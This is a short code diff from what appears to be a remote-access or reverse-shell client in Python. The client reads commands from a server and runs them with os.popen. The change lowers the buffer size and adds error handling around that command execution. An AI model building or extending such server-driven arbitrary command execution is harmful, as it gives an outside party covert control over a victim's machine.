@@ -3,7 +3,7 @@ import os
 import platform
 import encryption
 
-BUFFER_SIZE = 4096
+BUFFER_SIZE = 1024
 SYSTEM_TYPE = platform.system()
 SYSTEM_NAME = os.popen("whoami").read().strip("\n")
 PORT = 8091
@@ -64,7 +64,11 @@ def handle_server_response(command, client_socket):
                 os.chdir(os.path.expanduser("~"))
                 output = os.getcwd()
         else:
-            output = os.popen(cmd).read()
+            try:
+                output = os.popen(cmd).read()
+            except UnicodeDecodeError:
+                print("UnicodeDecodeError")
+                output = "Error"
         return "execute", output
 
     elif cmd_type == "file":
